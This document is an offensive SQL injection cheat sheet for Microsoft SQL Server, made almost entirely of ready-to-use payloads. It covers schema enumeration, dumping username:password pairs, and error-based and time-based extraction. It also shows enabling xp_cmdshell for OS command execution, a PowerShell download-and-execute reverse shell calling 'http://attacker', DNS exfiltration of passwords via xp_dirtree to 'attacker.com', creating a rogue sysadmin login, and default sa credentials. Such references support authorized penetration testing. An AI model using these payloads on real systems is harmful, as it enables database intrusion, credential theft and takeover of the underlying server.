# MSSQL (SQL Server) SQL Injection

## Version Detection

```sql
SELECT @@version
SELECT SERVERPROPERTY('productversion')
```

## Information Gathering

### Current Context

| Query                                                         | Description      |
| ------------------------------------------------------------- | ---------------- |
| `SELECT user`                                                 | Current user     |
| `SELECT system_user`                                          | System user      |
| `SELECT user_name()`                                          | User name        |
| `SELECT DB_NAME()`                                            | Current database |
| `SELECT @@SERVERNAME`                                         | Server name      |
| `SELECT @@SERVICENAME`                                        | Service name     |
| `SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID` | Login name       |

### Database Enumeration

```sql
-- List databases
SELECT name FROM master..sysdatabases
SELECT name FROM sys.databases

-- List tables
SELECT table_name FROM information_schema.tables
SELECT name FROM sysobjects WHERE xtype='U'

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')

-- List all with schema
SELECT table_catalog,table_name FROM information_schema.columns
```

### Pagination (Alternative to OFFSET)

**⚠️ MSSQL does NOT support `LIMIT ... OFFSET` - Use `NOT IN` with `TOP` instead**

```sql
-- Get row 1
SELECT TOP 1 table_name FROM information_schema.tables

-- Get row 2 (skip first 1)
SELECT TOP 1 table_name FROM information_schema.tables
WHERE table_name NOT IN (
    SELECT TOP 1 table_name FROM information_schema.tables
)

-- Get row 3 (skip first 2)
SELECT TOP 1 table_name FROM information_schema.tables
WHERE table_name NOT IN (
    SELECT TOP 2 table_name FROM information_schema.tables
)

-- Get row N (skip first N-1)
SELECT TOP 1 table_name FROM information_schema.tables
WHERE table_name NOT IN (
    SELECT TOP (N-1) table_name FROM information_schema.tables
)
```

**⚠️ CRITICAL:** When filtering by specific table, **MUST include `WHERE` clause in BOTH outer and inner queries**:

```sql
-- ✅ CORRECT - Filter table_name in both queries
SELECT TOP 1 column_name FROM information_schema.columns
WHERE table_name='users'
AND column_name NOT IN (
    SELECT TOP 2 column_name FROM information_schema.columns
    WHERE table_name='users'  -- ✅ Must filter here too!
)

-- ❌ WRONG - Missing filter in subquery
SELECT TOP 1 column_name FROM information_schema.columns
WHERE table_name='users'
AND column_name NOT IN (
    SELECT TOP 2 column_name FROM information_schema.columns
    -- ❌ Will return ANY 2 columns from ALL tables!
)
```

**Practical Examples:**

```sql
-- Get 3rd table name
SELECT TOP 1 table_name FROM information_schema.tables
WHERE table_name NOT IN (SELECT TOP 2 table_name FROM information_schema.tables)

-- Get 3rd column of 'users' table
SELECT TOP 1 column_name FROM information_schema.columns
WHERE table_name='users'
AND column_name NOT IN (
    SELECT TOP 2 column_name FROM information_schema.columns
    WHERE table_name='users'
)

-- In Boolean Blind SQLi context
IIF((SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP 2 table_name FROM information_schema.tables)),1,1))='f', true_val, false_val)
```

### User Information

```sql
-- List logins
SELECT name FROM master..syslogins
SELECT name FROM sys.sql_logins

-- Check sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT is_srvrolemember('sysadmin','sa')

-- List sysadmin members
SELECT name FROM master..syslogins WHERE sysadmin=1
```

## String Functions

| Function    | Example                  | Result |
| ----------- | ------------------------ | ------ |
| Concat      | `'a'+'b'`                | `ab`   |
| `CONCAT`    | `CONCAT('a','b')`        | `ab`   |
| `SUBSTRING` | `SUBSTRING('hello',1,3)` | `hel`  |
| `LEFT`      | `LEFT('hello',2)`        | `he`   |
| `RIGHT`     | `RIGHT('hello',2)`       | `lo`   |
| `LEN`       | `LEN('hello')`           | `5`    |
| `ASCII`     | `ASCII('A')`             | `65`   |
| `CHAR`      | `CHAR(65)`               | `A`    |
| `NCHAR`     | `NCHAR(65)`              | `A`    |
| `UNICODE`   | `UNICODE('A')`           | `65`   |

### String Aggregation (Concatenating Multiple Rows)

**⚠️ Important:** `CONCAT()` only accepts **scalar values**, NOT subqueries that return multiple rows!

#### ❌ WRONG - This will fail:

```sql
SELECT CONCAT((SELECT table_name FROM information_schema.tables))
-- Error: Subquery returned more than 1 value
```

#### ✅ CORRECT - Use FOR XML PATH:

```sql
-- Method 1: FOR XML PATH('') - Recommended
SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))

-- Method 2: FOR XML PATH(''), TYPE
SELECT (SELECT table_name AS 'data()' FROM information_schema.tables FOR XML PATH(''))

-- Method 3: STRING_AGG (MSSQL 2017+)
SELECT STRING_AGG(table_name, ',') FROM information_schema.tables

-- In UNION context:
' UNION SELECT 1,(SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')),3,4--
' UNION SELECT 1,STRING_AGG(table_name,','),3,4 FROM information_schema.tables--
```

#### Common Use Cases:

```sql
-- List all databases
SELECT (SELECT name+',' FROM master..sysdatabases FOR XML PATH(''))

-- List all tables
SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))

-- List all columns from a table
SELECT (SELECT column_name+',' FROM information_schema.columns WHERE table_name='users' FOR XML PATH(''))

-- Extract data from multiple rows
SELECT (SELECT username+':'+password+'|' FROM users FOR XML PATH(''))
```

## Comment Syntax

```sql
-- Single line
SELECT 1--comment
SELECT 1/*comment*/

-- Inline
SEL/**/ECT 1
```

## Stacked Queries

MSSQL fully supports stacked queries:

```sql
SELECT 1; SELECT 2; SELECT 3
'; SELECT @@version--
'; EXEC xp_cmdshell 'whoami'--
```

## Conditional Statements

```sql
-- IF/ELSE
IF (1=1) SELECT 'true' ELSE SELECT 'false'

-- CASE
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END

-- IIF (2012+)
SELECT IIF(1=1,'true','false')
```

## Time Delays

```sql
-- WAITFOR DELAY
WAITFOR DELAY '0:0:5'
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Conditional
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
```

## Error-based Extraction

```sql
-- CONVERT/CAST
SELECT CONVERT(int,@@version)
SELECT CAST(@@version AS int)
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- Implicit conversion
SELECT 1/@@version
```

### XML PATH for Multiple Rows

```sql
SELECT CAST((SELECT name+',' FROM master..sysdatabases FOR XML PATH('')) AS int)
SELECT CAST((SELECT name AS "data()" FROM master..sysdatabases FOR XML PATH('')) AS int)
```

## OS Command Execution

### xp_cmdshell

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE

-- Execute commands
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user'
EXEC xp_cmdshell 'dir c:\'

-- Reverse shell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"'
```

### OLE Automation

```sql
-- Enable OLE Automation
EXEC sp_configure 'Ole Automation Procedures',1
RECONFIGURE

-- Execute command
DECLARE @shell INT
EXEC sp_OACreate 'wscript.shell',@shell OUT
EXEC sp_OAMethod @shell,'run',null,'cmd /c whoami > c:\temp\output.txt'
```

### Agent Jobs

```sql
-- Create job with command
USE msdb
EXEC sp_add_job @job_name='test'
EXEC sp_add_jobstep @job_name='test',@step_name='step1',
  @subsystem='CMDEXEC',@command='whoami > c:\temp\out.txt'
EXEC sp_add_jobserver @job_name='test'
EXEC sp_start_job @job_name='test'
```

## File Operations

### Read Files

```sql
-- OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini',SINGLE_CLOB) AS x

-- xp_cmdshell
EXEC xp_cmdshell 'type C:\Windows\win.ini'
```

### Write Files

```sql
-- Using xp_cmdshell
EXEC xp_cmdshell 'echo test > C:\temp\file.txt'

-- BCP
EXEC xp_cmdshell 'bcp "SELECT @@version" queryout C:\temp\ver.txt -c -T'
```

## DNS/Network Exfiltration

```sql
-- xp_dirtree (DNS)
EXEC master..xp_dirtree '\\attacker.com\share'
'; DECLARE @d VARCHAR(1024); SET @d=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\a"')--

-- xp_fileexist
EXEC master..xp_fileexist '\\attacker.com\share\file'

-- xp_subdirs
EXEC master..xp_subdirs '\\attacker.com\share'
```

## Privilege Escalation

### Impersonation

```sql
-- Find impersonatable logins
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
WHERE a.permission_name='IMPERSONATE'

-- Impersonate
EXECUTE AS LOGIN='sa'
SELECT @@VERSION
REVERT  -- Return to original
```

### Create Sysadmin

```sql
-- Create login
CREATE LOGIN [attacker] WITH PASSWORD='P@ssw0rd'

-- Add to sysadmin
EXEC sp_addsrvrolemember 'attacker','sysadmin'
```

### Linked Servers

```sql
-- List linked servers
EXEC sp_linkedservers
SELECT * FROM sys.servers

-- Query linked server
SELECT * FROM OPENQUERY(LinkedServer,'SELECT @@version')
EXEC('SELECT @@version') AT LinkedServer

-- xp_cmdshell on linked server
EXEC('EXEC xp_cmdshell ''whoami''') AT LinkedServer
```

### Trustworthy Databases

```sql
-- Find trustworthy databases
SELECT name,is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on=1
```

## Default Credentials

Common SQL Server instance defaults:

| Instance   | User | Password      |
| ---------- | ---- | ------------- |
| Default    | `sa` | `sa` or blank |
| SQLEXPRESS | `sa` | varies        |
| Custom     | `sa` | varies        |

## Quick Payload Reference

```sql
-- Auth bypass
' OR 1=1--
admin'--

-- Union
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,@@version,3--

-- Error
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,DB_NAME())--

-- Stacked
'; SELECT @@version--
'; EXEC xp_cmdshell 'whoami'--

-- Time-based
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- DNS exfil
'; EXEC master..xp_dirtree '\\attacker.com\a'--
```

## Detection Hints

```
Error patterns:
- "Unclosed quotation mark"
- "Incorrect syntax near"
- "Conversion failed when converting"

Application hints:
- ASP/ASPX typically uses MSSQL
- IIS web server
```
